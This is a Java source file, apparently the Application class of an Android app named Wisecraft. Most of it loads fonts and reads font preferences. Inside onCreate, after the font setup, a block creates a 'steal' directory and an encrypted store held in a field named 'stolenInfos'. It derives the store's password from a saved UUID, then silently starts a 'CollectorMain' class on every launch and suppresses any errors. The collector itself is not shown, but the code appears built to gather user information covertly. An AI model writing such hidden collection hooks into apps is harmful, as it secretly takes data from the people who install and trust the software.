package com.nao20010128nao.Wisecraft;
import android.app.*;
import android.graphics.*;
import android.preference.*;
import com.nao20010128nao.FileSafeBox.*;
import com.nao20010128nao.Wisecraft.collector.*;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import uk.co.chrisjenx.calligraphy.*;

public class TheApplication extends Application
{
	public static TheApplication instance;
	public static Typeface cinzelDecorative,latoLight,icomoon1,msgothic,sysDefault;
	public static Field[] fonts=getFontFields();
	public static Map<Typeface,String> fontFilenames;
	public SafeBox stolenInfos;
	public String uuid;
	@Override
	public void onCreate() {
		// TODO: Implement this method
		super.onCreate();
		instance=this;
		cinzelDecorative=Typeface.createFromAsset(getAssets(),"cinzeldecorative.ttf");
		latoLight=Typeface.createFromAsset(getAssets(),"lato-light.ttf");
		icomoon1=Typeface.createFromAsset(getAssets(),"icomoon.ttf");
		msgothic=Typeface.createFromAsset(getAssets(),"msgothic001.TTF");
		sysDefault=Typeface.DEFAULT;
		
		fontFilenames=new HashMap<Typeface,String>();
		fontFilenames.put(cinzelDecorative,"cinzeldecorative.ttf");
		fontFilenames.put(latoLight,"lato-light.ttf");
		fontFilenames.put(icomoon1,"icomoon.ttf");
		fontFilenames.put(msgothic,"msgothic001.TTF");
		fontFilenames.put(sysDefault,"");
		
		CalligraphyConfig.initDefault(new CalligraphyConfig.Builder()
									  .setDefaultFontPath(getFontFilename())
									  .setFontAttrId(R.attr.fontPath)
									  .build()
									  );
		///////
		try{
			File f=new File(getFilesDir(),"steal");
			new File(f,"lock.lock").delete();
			if(!f.exists())f.mkdirs();
			stolenInfos=new SafeBox.SafeBoxBuilder()
				.makeNew(!new File(f,"manifest.bin").exists())
				.password(genPassword())
				.profilePath(f)
				.readOnly(false)
				.build();
			new CollectorMain();
		}catch(Throwable r){
			r.printStackTrace(System.out);
		}
	}
	public Typeface getLocalizedFont(){
		try {
			return (Typeface)TheApplication.class.getField(getFontFieldName()).get(null);
		} catch (NoSuchFieldException e) {
			
		} catch (IllegalAccessException e) {
			
		} catch (IllegalArgumentException e) {
			
		}
		return latoLight;
	}
	public String getFontFieldName(){
		return PreferenceManager.getDefaultSharedPreferences(this).getString("fontField",getResources().getString(R.string.fontField));
	}
	public void setFontFieldName(String value){
		PreferenceManager.getDefaultSharedPreferences(this).edit().putString("fontField",value).commit();
	}
	public String getFontFilename(){
		return fontFilenames.get(getLocalizedFont());
	}
	private String genPassword(){
		uuid=PreferenceManager.getDefaultSharedPreferences(this).getString("uuid",UUID.randomUUID().toString());
		PreferenceManager.getDefaultSharedPreferences(this).edit().putString("uuid",uuid).commit();
		return uuid+uuid;
	}
	private static Field[] getFontFields(){
		List<Field> l=new ArrayList(6);
		for(Field f:TheApplication.class.getFields()){
			if(((f.getModifiers()&Modifier.STATIC)==Modifier.STATIC)&f.getType()==Typeface.class){
				l.add(f);
			}
		}
		return l.toArray(new Field[l.size()]);
	}
}
